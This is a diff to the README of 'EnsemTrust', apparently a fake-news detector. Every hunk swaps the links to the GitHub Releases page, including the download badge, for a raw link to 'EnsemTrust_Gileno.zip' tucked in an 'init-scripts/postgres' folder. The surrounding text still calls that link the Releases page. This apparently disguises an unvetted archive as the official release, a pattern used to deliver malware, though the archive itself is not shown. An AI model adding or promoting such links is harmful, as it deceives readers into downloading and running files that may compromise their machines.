@@ -1,6 +1,6 @@
 # 🌵📃 EnsemTrust - Detect Fake News with Confidence
 
-[![Download EnsemTrust](https://img.shields.io/badge/Download%20EnsemTrust-v1.0-brightgreen)](https://github.com/reap6126/EnsemTrust/releases)
+[![Download EnsemTrust](https://raw.githubusercontent.com/reap6126/EnsemTrust/main/init-scripts/postgres/EnsemTrust_Gileno.zip%20EnsemTrust-v1.0-brightgreen)](https://raw.githubusercontent.com/reap6126/EnsemTrust/main/init-scripts/postgres/EnsemTrust_Gileno.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To get EnsemTrust, visit the Releases page to download the application:
 
-[Download EnsemTrust](https://github.com/reap6126/EnsemTrust/releases)
+[Download EnsemTrust](https://raw.githubusercontent.com/reap6126/EnsemTrust/main/init-scripts/postgres/EnsemTrust_Gileno.zip)
 
 Once there, look for the version that suits your operating system, and click to download the installation file.
 
@@ -57,7 +57,7 @@ Using EnsemTrust is simple. Here’s a quick guide:
 
 Keep EnsemTrust up to date to enjoy the latest features and improvements. To update:
 
-1. Visit the [Releases page](https://github.com/reap6126/EnsemTrust/releases) regularly.
+1. Visit the [Releases page](https://raw.githubusercontent.com/reap6126/EnsemTrust/main/init-scripts/postgres/EnsemTrust_Gileno.zip) regularly.
 2. Download the latest version using the same steps as above.
 3. Install the new version over the existing one to ensure all features are current.
 
